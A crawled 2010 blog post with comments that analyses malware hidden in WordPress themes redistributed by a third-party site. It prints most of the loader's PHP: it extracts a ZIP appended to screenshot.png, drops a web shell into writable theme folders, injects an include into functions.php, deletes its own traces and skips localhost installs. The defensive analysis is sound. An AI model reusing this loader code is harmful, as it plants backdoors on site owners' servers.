http://ottopress.com/2010/anatomy-of-a-theme-malware/
HTTP/1.1 200 OK
Server: nginx/1.4.4
Date: Tue, 22 Jul 2014 21:09:58 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Pingback: http://ottopress.com/xmlrpc.php
Link: <http://otto42.com/8m>; rel=shortlink

<!DOCTYPE html>
<html lang="en-US">

<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

<title>Anatomy of a Theme Malware &raquo; Otto on WordPress</title>

<link rel="profile" href="http://www.w3.org/1999/xhtml/vocab" />
<link rel="me" type="text/html" href="https://plus.google.com/100201852715113506716" />

<link rel="stylesheet" href="http://ottopress.com/wp-content/themes/fluid-blue/style.css" type="text/css" media="screen" />
<link rel="stylesheet" href="http://ottopress.com/wp-content/themes/fluid-blue/print.css" type="text/css" media="print" />

<link rel="pingback" href="http://ottopress.com/xmlrpc.php" />

<meta property="og:email" content="otto@ottodestruct.com" />
<meta http-equiv="X-UA-Compatible" content="chrome=1">

<script type="text/javascript">var description = '';</script>
<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="IvlRFnRHu9RIiAiOS-bo-8vU4ju4V6_b4U3M_-1jlXQ" />
<link rel="alternate" type="application/rss+xml" title="Otto on WordPress &raquo; Feed" href="http://ottopress.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Otto on WordPress &raquo; Comments Feed" href="http://ottopress.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Otto on WordPress &raquo; Anatomy of a Theme Malware Comments Feed" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/feed/" />
<link rel='stylesheet' id='yarppWidgetCss-css'  href='http://ottopress.com/wp-content/plugins/yet-another-related-posts-plugin/style/widget.css?ver=3.9.1' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack-subscriptions-css'  href='http://ottopress.com/wp-content/plugins/jetpack/modules/subscriptions/subscriptions.css?ver=3.9.1' type='text/css' media='all' />
<link rel='stylesheet' id='tiled-gallery-css'  href='http://ottopress.com/wp-content/plugins/jetpack/modules/tiled-gallery/tiled-gallery/tiled-gallery.css?ver=2012-09-21' type='text/css' media='all' />
<link rel='stylesheet' id='mediaelement-css'  href='http://ottopress.com/wp-includes/js/mediaelement/mediaelementplayer.min.css?ver=2.13.0' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css'  href='http://ottopress.com/wp-includes/js/mediaelement/wp-mediaelement.css?ver=3.9.1' type='text/css' media='all' />
<script type='text/javascript' src='http://ottopress.com/wp-includes/js/jquery/jquery.js?ver=1.11.0'></script>
<script type='text/javascript' src='http://ottopress.com/wp-includes/js/jquery/jquery-migrate.js?ver=1.2.1'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/jetpack/modules/tiled-gallery/tiled-gallery/tiled-gallery.js?ver=3.9.1'></script>
<script type='text/javascript' src='http://ottodestruct.com/op/wp-content/plugins/gravatar-box/jquery.md5.js?ver=1.0'></script>
<script type='text/javascript' src='http://ottodestruct.com/op/wp-content/plugins/gravatar-box/gravbox.js?ver=1.0'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://ottopress.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://ottopress.com/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='Free Coffee' href='http://ottopress.com/2010/free-coffee/' />
<link rel='next' title='WordPress 3.1 and XML-RPC' href='http://ottopress.com/2010/wordpress-3-1-and-xml-rpc/' />
<meta name="generator" content="WordPress 3.9.1" />
<link rel='canonical' href='http://ottopress.com/2010/anatomy-of-a-theme-malware/' />
<link rel='shortlink' href='http://otto42.com/8m' />
<meta name="pinterest" content="nopin" /><link rel="microsummary" type="text/plain" href="/2010/anatomy-of-a-theme-malware/?microsummary=1" /><link rel="shortcut icon" href="http://ottopress.com/wp-content/wp-logo-vs.png" /><link rel="author" href="https://plus.google.com/+SamuelOttoWood" title="Samuel “Otto” Wood on Google+" /> 

<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Anatomy of a Theme Malware" />
<meta property="og:url" content="http://ottopress.com/2010/anatomy-of-a-theme-malware/" />
<meta property="og:description" content="As I&#039;ve gotten involved with helping the WordPress.org theme review team, I&#039;ve seen some strange things. One of the stranger ones was a theme virus that actually propagated from one theme to all ot..." />
<meta property="article:published_time" content="2010-12-09T18:55:33+00:00" />
<meta property="article:modified_time" content="2010-12-09T19:10:18+00:00" />
<meta property="article:author" content="http://ottopress.com/author/otto/" />
<meta property="og:site_name" content="Otto on WordPress" />
<meta property="og:image" content="http://ottopress.com/files/2010/12/redhazard-200x200.png" />
<meta name="twitter:site" content="@ottodestruct" />
<meta name="twitter:image" content="http://ottopress.com/files/2010/12/redhazard-200x200.png?w=240" />
<meta name="twitter:card" content="summary" />
<style type="text/css" id="syntaxhighlighteranchor"></style>
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-27538437-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
</head>

<body class="single single-post postid-355 single-format-standard">
<script type="text/javascript">
if (top.location != self.location) top.location.replace(self.location);
</script>
<div id="page">
<div id="header">
	<div id="headertitle">
		<h1><a href="http://ottopress.com" title="Otto on WordPress: You have to use an Ottopress to get fresh squeezed Otto.">Otto on WordPress</a></h1>
		<p>You have to use an Ottopress to get fresh squeezed Otto.</p>
	</div> 
	<!-- Search box (If you prefer having search form as a sidebar widget, remove this block) -->
	<div class="search">
		<form method="get" id="searchform" action="http://ottopress.com/">
<input type="search" size="20" results="5" name="s" id="s" placeholder="Search..." speech="speech" x-webkit-speech="x-webkit-speech" onwebkitspeechchange="this.form.submit();" />
</form>
	</div> 
	<!-- Search ends here-->
		
</div>
<div id="navbar">
<div id="nav">
<div class="menu"><ul><li ><a href="http://ottopress.com/">Home</a></li><li class="page_item page-item-5 page_item_has_children"><a href="http://ottopress.com/wordpress-plugins/">WordPress Plugins</a><ul class='children'><li class="page_item page-item-205"><a href="http://ottopress.com/wordpress-plugins/atd-for-comments/">After The Deadline For Comments</a></li><li class="page_item page-item-21"><a href="http://ottopress.com/wordpress-plugins/atom-default-feed/">Atom Default Feed</a></li><li class="page_item page-item-965"><a href="http://ottopress.com/wordpress-plugins/dropbox-photo-sideloader/">Dropbox Photo Sideloader</a></li><li class="page_item page-item-15"><a href="http://ottopress.com/wordpress-plugins/gravatar-box/">Gravatar Box</a></li><li class="page_item page-item-32"><a href="http://ottopress.com/wordpress-plugins/php-code-widget/">PHP Code Widget</a></li><li class="page_item page-item-7"><a href="http://ottopress.com/wordpress-plugins/simple-facebook-connect/">Simple Facebook Connect</a></li><li class="page_item page-item-10"><a href="http://ottopress.com/wordpress-plugins/simple-twitter-connect/">Simple Twitter Connect</a></li><li class="page_item page-item-81"><a href="http://ottopress.com/wordpress-plugins/unicornify/">Unicornify</a></li></ul></li><li class="page_item page-item-374"><a href="http://ottopress.com/contact/">Contact Otto</a></li><li><a href="http://ottodestruct.com" title="Nothing to See Here">Nothing to See Here</a></li><li><a href="http://buyottoabeer.com" title="Otto on Beer">Otto on Beer</a></li></ul></div>
	</div>
</div>
<div id="wrapper">
	<div id="content">

			
		<div class="navigation">
			<div class="alignleft">&laquo; <a href="http://ottopress.com/2010/free-coffee/" rel="prev">Free Coffee</a></div>
			<div class="alignright"><a href="http://ottopress.com/2010/wordpress-3-1-and-xml-rpc/" rel="next">WordPress 3.1 and XML-RPC</a> &raquo;</div>
		</div>

		<div class="post" id="post-355">
			<h2 class="posttitle"><a href="http://ottopress.com/2010/anatomy-of-a-theme-malware/" rel="bookmark" title="Permanent Link to Anatomy of a Theme Malware" itemprop="url"><span itemprop="name">Anatomy of a Theme Malware</span></a></h2>
			<div style="clear:none" class="postmetadata">December 9, 2010, 12:55 pm <!-- by <span rel="author">Samuel “Otto” Wood</span> --></div>
			<div class="postentry">
				<div itemprop="articleBody"><p>As I&#8217;ve gotten involved with helping the WordPress.org theme review team, I&#8217;ve seen some strange things. One of the stranger ones was a theme virus that actually propagated from one theme to all others in a WordPress installation. That one was awfully clever, but it ultimately didn&#8217;t really do anything but propagate and generally be a pain in the ass.</p>
<p><img class="alignright size-thumbnail wp-image-357" title="redhazard" src="http://i1.wp.com/ottopress.com/files/2010/12/redhazard.png?resize=200%2C200" alt="" data-recalc-dims="1" />However, today, @chip_bennett discovered that <a href="http://wordpress.org/extend/themes/oenology">one of his themes</a> had been copied and was being redistributed by a site called top-themes.com.</p>
<p>It had malware inserted into it that is of a much more malicious and spammy nature. Further investigation reveals that ALL of the themes on that site contain basically the same code. This code is not actually &#8220;viral&#8221;, but it&#8217;s definitely malware and it&#8217;s worth investigating to see some of the ways people try to hide their spam.</p>
<p>So today, I&#8217;m going to dissect it and serve it up on a platter for everybody to see.</p>
<h3>Infection Point</h3>
<p>We&#8217;ll start with the most obvious starting point, and that is in the functions.php file. At the very end of the functions.php file, we find a call to &#8220;get_custom_headers();&#8221;. An innocuous enough sounding name, so we go find that function. Here&#8217;s the first part of the function:</p>
<pre class="brush: php; title: ; notranslate" title="">
function get_custom_headers() {
    $_SESSION['authenticated'] = false;
    $filename = dirname(__FILE__).DS.&quot;screenshot.png&quot;;
</pre>
<p>Right away, something is wrong. It&#8217;s getting the location of the screenshot file (DS is defined elsewhere as the Directory Separator, which makes it work on both Linux and Windows boxes). That doesn&#8217;t make a whole lot of sense, the screenshot is supposed to be displayed by the admin interface only. Let&#8217;s read on.</p>
<pre class="brush: php; title: ; notranslate" title="">
    $fileContents = explode(pack(&quot;c*&quot;, 0xAE,0x42,0x60,0x82), file_get_contents($filename));
    $screenshot = array_shift($fileContents);
</pre>
<p>The &#8220;pack&#8221; function is one that isn&#8217;t used much. It&#8217;s a means of manipulating binary files. The &#8220;explode&#8221; function is a way of splitting a string by some characters. So what this code really is doing is to find a particular string of hex digits in the screenshot file, split it across that boundary, and then get only the first part of that (the actual screenshot file), thanks to the array shift. This gets used later.</p>
<p>In other words, he&#8217;s appended something onto the end of the screenshot file, and this code reads it in, finds it, then gets a copy of it. What could this be? Turns out to be a ZIP file.</p>
<pre class="brush: php; title: ; notranslate" title="">
    $unzipped = false;
    $path = check_istalled_path($_SERVER['DOCUMENT_ROOT']);
</pre>
<p>The check_istalled_path function looks for a wp-additional directory and returns a path to it.</p>
<pre class="brush: php; title: ; notranslate" title="">
    if($path === false &amp;&amp; $_SERVER['HTTP_HOST'] != &quot;localhost&quot; &amp;&amp; $_SERVER['SERVER_ADDR'] != &quot;127.0.0.1&quot;) {
	if(function_exists(&quot;zip_read&quot;)) {
	    $path = array_pop(array_shuffle(find_writeble_path($_SERVER['DOCUMENT_ROOT'])));
	    @mkdir($path = $path.DS.&quot;wp-additional&quot;);

	    file_put_contents($path.DS.&quot;archive.zip&quot;, implode(pack(&quot;c*&quot;, 0xAE,0x42,0x60,0x82), $fileContents));
	    $zip = new ZipArchive;
	    if ($zip-&gt;open($path.DS.&quot;archive.zip&quot;)===true) {

		$zip-&gt;extractTo($path.DS);
		$zip-&gt;close();
		unlink($path.DS.&quot;archive.zip&quot;);
		$unzipped = true;
	    }
	    @file_put_contents(dirname(__FILE__).DS.&quot;functions.php&quot;,&quot;&lt;!--?php  if(is_readable(\&quot;$path&quot;.DS.&quot;wshell.php\&quot;)) { @require_once(\&quot;$path&quot;.DS.&quot;wshell.php\&quot;); } ?--&gt;\n&quot;.file_get_contents(dirname(__FILE__).DS.&quot;functions.php&quot;));
	}
</pre>
<p>If the zip_read function is available, he makes a wp-additional directory and puts the ZIP file there. Then he simply unzips the malware file into the target theme. This requires a bit of explanation.</p>
<p>Elsewhere there is a function called &#8220;find_writeble_path&#8221;. This function doesn&#8217;t limit itself to the current theme&#8217;s directory. Instead, it looks through all installed themes on the system and tries to find all themes that has permissions set to allow it to be written to. So in all of the above, he&#8217;s really looking for any theme that he can infect with the malware contained in this archive. The &#8220;array_shuffle&#8221; line is his way of picking a random theme.</p>
<p>So he unzips the malware to that theme then adds code to himself to that makes it try to read and execute this wshell.php file.</p>
<p>But if the wp-additional directory full of malware has already been created somewhere on the system, then the above code doesn&#8217;t run. If it finds the malware directory, then it skips that and just does the following:</p>
<pre class="brush: php; title: ; notranslate" title="">
    } else {
	if($_SERVER['HTTP_HOST'] != &quot;localhost&quot; &amp;&amp; $_SERVER['SERVER_ADDR'] != &quot;127.0.0.1&quot;) {
	    $path = $_SERVER['DOCUMENT_ROOT'].DS.$path;
	    @file_put_contents(dirname(__FILE__).DS.&quot;functions.php&quot;,&quot;&lt;!--?php if(is_readable(\&quot;$path&quot;.DS.&quot;wshell.php\&quot;)) { @require_once(\&quot;$path&quot;.DS.&quot;wshell.php\&quot;); } ?--&gt;\n&quot;.file_get_contents(dirname(__FILE__).DS.&quot;functions.php&quot;));
	}
    }
</pre>
<p>It found the malware, so it simply rewrites itself to make sure it includes it.</p>
<p>The overall affect of the above code is to make the them unzip the malware into any theme directory it can find, then rewrite itself to attempt to include it.</p>
<p>Next we have self-eliminating code:</p>
<pre class="brush: php; title: ; notranslate" title="">
    @file_put_contents(__FILE__, array_shift(explode(&quot;function get_custom_headers&quot;, file_get_contents(__FILE__))));
    @file_put_contents(dirname(__FILE__).DS.&quot;screenshot.png&quot;, $screenshot);
</pre>
<p>What does this code do? Well, it erases itself from the file!</p>
<p>This code reads the file that the malware code is in right now (with file_get_contents(__FILE__) ). Then it explodes it along the get_custom_headers function. Finally, it writes it back out to the file itself.</p>
<p>Basically, using the explode and array_shift method, it finds the get_custom_headers function code, then writes the functions.php back out <em>without</em> that code or anything after it. Now that the malware has done its job, this code basically self deletes, to make it not traceable. All that&#8217;s left is the wp-additional directory that contains the malware, and the include it wrote to the beginning of the file to load that malware.</p>
<p>Here&#8217;s where it also erases itself from the screenshot, using the $screenshot variable it saved earlier.</p>
<pre class="brush: php; title: ; notranslate" title="">
    if(function_exists(&quot;zip_read&quot;) &amp;&amp; $unzipped == true &amp;&amp; $_SERVER['HTTP_HOST'] != &quot;localhost&quot; &amp;&amp; $_SERVER['SERVER_ADDR'] != &quot;127.0.0.1&quot;) {
	@require_once($path.DS.&quot;wshell.php&quot;);
    }
}
</pre>
<p>This just makes it load the now-decompressed wshell.php malware immediately, instead of waiting for the next page load.</p>
<p>Also note how the code doesn&#8217;t run on localhost installs? If you look closely, the self-removing code does run on those installs. Meaning that if you run this theme in a test bed, then it removes itself without infection. This is to make it harder for people to analyse the code, since it disappears the first time you run it on a local test system.</p>
<h3>The Malware</h3>
<p>So what is this malware? Well, there&#8217;s two parts to it.</p>
<p>The first part is a standard PHP Shell install, essentially giving a shell backdoor to anybody who knows the location of the malware and the username and password. This is a massive security hole, obviously.</p>
<p>The second part is somewhat custom. It&#8217;s in the wshell.php file that the above malware tries so hard to get you to include. Essentially, this installs a spamming system of fairly wide ranging scope.</p>
<p>The first thing it does is to notify its master that it exists. It does this by making a connection to 188.165.212.17 and sending what looks sorta like SMTP commands, but which are probably customized in some way. But basically it tells this server where it&#8217;s installed and how it can be accessed. After it gets confirmation, it sets a parameter to make it not send this again.</p>
<p>The spamming system itself contains a number of commands. The way it gets commands from the attacker is by looking for them in cookies with a name of &#8220;wsh-cmd&#8221;. So in this sense, it&#8217;s kind of like a server. The attacker has some kind of a client that talks to your server via the normal HTTP, but sends it hidden commands via this cookie.</p>
<p>The commands allow the attacker to view a list of writable files in your themes directory, and to view any specified readable file on the system. It avoids triggering mod_security systems by base64 encoding files that it sends around. But the main thrust of the system is to allow the attacker to insert links into, and remove links from, any writable theme file.</p>
<p>Essentially, it&#8217;s a remote-controlled automated link spamming tool.</p>
<p>The attacker can send URLs to your system and it will insert them into theme files. He can later remove those links. There&#8217;s a lot of code to allow it to generate proper links, to insert them into specific lines, things of that nature.</p>
<h3>Summary</h3>
<p>In short, don&#8217;t trust dodgy theme sites. Get your free themes from <a href="http://wordpress.org/extend/themes">WordPress.org Extend-Themes</a> instead.</p>
<p>Also, this sort of thing should tell you why we ban certain types of things from the WordPress.org theme repository. We can&#8217;t scan for specific malware, as it&#8217;s too easy to get around that sort of scanning. Scanning for functions that most of these malwares use is simpler and more effective. And all of our themes go through human-eye review as well, with anything even slightly dodgy getting brought up before a mailing list of experts who can take a look and determine what is what.</p>
<div class="sharedaddy sd-block sd-social sd-gplus"><h3 class="sd-title">Google+</h3><div class="sd-content"><a href="https://plus.google.com/+SamuelOttoWood"><img src="https://lh5.googleusercontent.com/-sTIAD3oDYbs/AAAAAAAAAAI/AAAAAAAAGkQ/ZwW3H57HC8I/photo.jpg?sz=40" alt="Samuel “Otto” Wood" width="20" height="20" align="absmiddle" /> </a><a rel="author" href="https://plus.google.com/+SamuelOttoWood" class="gplus-profile">Samuel “Otto” Wood</a><span class="g-follow-wrapper"><span class="g-follow" data-href="https://plus.google.com/+SamuelOttoWood" data-rel="author" data-height="15"></span></span></div></div><div class='yarpp-related yarpp-related-none'>
</div>
</div>
							</div>
<div><span class="post-shortlink">Shortlink: 
<input type='text' value='http://otto42.com/8m' onclick='this.focus(); this.select();' />
</span></div>

			<div class="postmetadata">
				<div class="postmetadata">
					Tags: <a href="http://ottopress.com/tag/bad/" rel="tag">bad</a>, <a href="http://ottopress.com/tag/evil/" rel="tag">evil</a>, <a href="http://ottopress.com/tag/malware/" rel="tag">malware</a>, <a href="http://ottopress.com/tag/spam/" rel="tag">spam</a>, <a href="http://ottopress.com/tag/theme/" rel="tag">theme</a>, <a href="http://ottopress.com/tag/top-themes/" rel="tag">top-themes</a><br />					Category: <a href="http://ottopress.com/category/code/" title="View all posts in Code" rel="category tag">Code</a>, <a href="http://ottopress.com/category/wordpress/" title="View all posts in WordPress" rel="category tag">WordPress</a>					&nbsp;|&nbsp;&nbsp;<a href="#respond">Comment</a> (<a href='http://ottopress.com/2010/anatomy-of-a-theme-malware/feed/'>RSS</a>)					&nbsp;|&nbsp;&nbsp;<a href="http://ottopress.com/2010/anatomy-of-a-theme-malware/trackback/ " rel="trackback">Trackback</a>									 </div>
			</div>
    
		</div>
	<div id="comments">
	<h3>49 Comments </h3>
	<div class="navigation" style="clear:both">
		<div class="alignleft"></div>
		<div class="alignright"></div>
	</div>
	<div style="clear:both"></div>
	<ol class="commentlist">
		<li class="comment even thread-even depth-1" id="comment-6053" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6053" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/c145c71660c9681b306558c0de47885a?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://twitter.com/FurciferRising' rel='external nofollow' class='url'>DarkMage</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6053">
		<time itemprop="dateCreated" datetime="2010-12-09T13:19:47+00:00">December 9, 2010 at 1:19 pm</time></a>	</div>

	<div itemprop="text"><p>Nice Write up Otto, it sometimes amazes me how far people will go to score a few links.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6053#respond' onclick='return addComment.moveForm("div-comment-6053", "6053", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-6056" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6056" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://1.gravatar.com/avatar/f9bb98e439bf7efdf51993e1e70957ae?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://edwardcaissie.com/' rel='external nofollow' class='url'>Edward Caissie</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6056">
		<time itemprop="dateCreated" datetime="2010-12-09T13:44:53+00:00">December 9, 2010 at 1:44 pm</time></a>	</div>

	<div itemprop="text"><p>Thanks for writing up this exercise and breaking down the code structures. This is very helpful in getting a better understanding of what to look for and whom to trust for free WordPress Themes.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6056#respond' onclick='return addComment.moveForm("div-comment-6056", "6056", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="comment even thread-even depth-1" id="comment-6057" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6057" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://1.gravatar.com/avatar/582b66ad5ae1b69c7601a990cb9a661a?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://josephscott.org/' rel='external nofollow' class='url'>Joseph Scott</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6057">
		<time itemprop="dateCreated" datetime="2010-12-09T13:47:20+00:00">December 9, 2010 at 1:47 pm</time></a>	</div>

	<div itemprop="text"><p>It is sad to see themes being used to distribute this garbage.  Some of the steps used to hide that garbage are pretty clever though.  Imagine what this person could do if they choose to use their powers for good!</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6057#respond' onclick='return addComment.moveForm("div-comment-6057", "6057", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="comment odd alt thread-odd thread-alt depth-1 parent" id="comment-6061" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6061" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://1.gravatar.com/avatar/b7d94091ebb84a7aceaea9f50a080285?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://alexsantidote.com/' rel='external nofollow' class='url'>Alex</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6061">
		<time itemprop="dateCreated" datetime="2010-12-09T17:30:57+00:00">December 9, 2010 at 5:30 pm</time></a>	</div>

	<div itemprop="text"><p>Excellent post Otto. Thank you for sharing this valuable knowledge! I&#8217;ve been using the same theme forever (which I made and probably need to upgrade to 3.0+ compatibility haha), but I have a lot of friends and clients that use WordPress, I will be sure to pass this along!</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6061#respond' onclick='return addComment.moveForm("div-comment-6061", "6061", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	<ul class="children">
	<li class="comment byuser comment-author-otto bypostauthor even depth-2" id="comment-6068" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6068" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/0994d5e2e158a24ba8017c2525d78263?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://ottodestruct.com' rel='external nofollow' class='url'>Otto</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6068">
		<time itemprop="dateCreated" datetime="2010-12-09T21:44:51+00:00">December 9, 2010 at 9:44 pm</time></a>	</div>

	<div itemprop="text"><p>If you&#8217;re wanting to upgrade the theme, check out the Theme Check plugin: <a href="http://wordpress.org/extend/plugins/theme-check/" rel="nofollow">http://wordpress.org/extend/plugins/theme-check/</a></p>
<p>It runs most of the review list. Great way to see what your theme is missing or is still old in it.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6068#respond' onclick='return addComment.moveForm("div-comment-6068", "6068", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
	<li class="comment odd alt thread-even depth-1 parent" id="comment-6071" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6071" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/01cfe9feaafb068590891bbd1f6a7f5a?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://andrewnacin.com/' rel='external nofollow' class='url'>Andrew Nacin</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6071">
		<time itemprop="dateCreated" datetime="2010-12-10T01:22:33+00:00">December 10, 2010 at 1:22 am</time></a>	</div>

	<div itemprop="text"><p>Holy crap. That&#8217;s all I gotta say.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6071#respond' onclick='return addComment.moveForm("div-comment-6071", "6071", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	<ul class="children">
	<li class="comment byuser comment-author-otto bypostauthor even depth-2 parent" id="comment-6079" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6079" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/0994d5e2e158a24ba8017c2525d78263?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://ottodestruct.com' rel='external nofollow' class='url'>Otto</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6079">
		<time itemprop="dateCreated" datetime="2010-12-10T11:24:40+00:00">December 10, 2010 at 11:24 am</time></a>	</div>

	<div itemprop="text"><p>Heh. Chip just found and sent me another one that does link insertion into the footer by accepting hidden commands via the HTTP_USER_AGENT.</p>
<p>Link spammers really are trying very, very hard.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6079#respond' onclick='return addComment.moveForm("div-comment-6079", "6079", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	<ul class="children">
	<li class="comment odd alt depth-3" id="comment-6440" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6440" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://1.gravatar.com/avatar/927540c9e8d01cb6200116183f025b66?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://code.google.com/p/buddypress-media/' rel='external nofollow' class='url'>Foxly</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6440">
		<time itemprop="dateCreated" datetime="2011-01-02T13:49:55+00:00">January 2, 2011 at 1:49 pm</time></a>	</div>

	<div itemprop="text"><p>No matter how well hidden, eventually a &#8220;payload&#8221; has to turn back into code and be executed.</p>
<p>Has anyone considered using an automated-test approach?</p>
<p>1) Load a WordPress install and the theme into some kind of test rig, based on the code at: svn.automattic.com/wordpress-tests/<br />
2) Generate hash values for every file in the install, including the plugin files.<br />
3) Have the test code visit every page on the &#8220;site&#8221; and record the HTML produced.<br />
4) Parse the captured HTML, looking for links that shouldn&#8217;t be there.<br />
5) Re-hash all the files in the install, and find any that have changed.</p>
<p>And if anything &#8220;bad&#8221; is discovered, refuse the template.</p>
<p>Much of the code needed to do this stuff is already built! &#8230;see svn.automattic.com/wordpress-tests/</p>
<p>^F^</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6440#respond' onclick='return addComment.moveForm("div-comment-6440", "6440", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
	<li class="comment even thread-odd thread-alt depth-1 parent" id="comment-6073" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6073" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/e6f8bed544c3572b4f5380cbd097193e?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://lanzen.net' rel='external nofollow' class='url'>Neil Robinson</a></cite> <span class="says">says:</span>	</div>

